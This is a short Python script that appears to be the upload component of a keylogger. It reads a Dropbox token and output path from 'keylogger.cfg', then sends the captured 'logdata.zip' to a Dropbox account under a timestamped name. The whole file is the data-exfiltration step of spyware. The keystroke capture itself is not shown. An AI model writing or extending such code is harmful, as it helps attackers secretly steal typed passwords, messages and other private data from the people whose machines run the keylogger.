import dropbox
from datetime import datetime
import configparser
import os

config = configparser.ConfigParser()
config.read('keylogger.cfg')

auth = str(config['DBInfo']['Auth'])
directory = str(config['Output']['OutputDirectoryFullPath'])

os.system('pwd > wd.txt')
wd = open('wd.txt', 'r+')
wd2 = wd.read()
wd2 = wd2.replace('\n', '')
wd2 = str(wd2)
wd.close()
os.system('rm wd.txt')
directory = str(wd2) + str(directory)

client = dropbox.client.DropboxClient(auth)
f = open(directory + '/logdata.zip', 'rb')
response = client.put_file('/logdata'+str(datetime.now()) + '.zip', f)
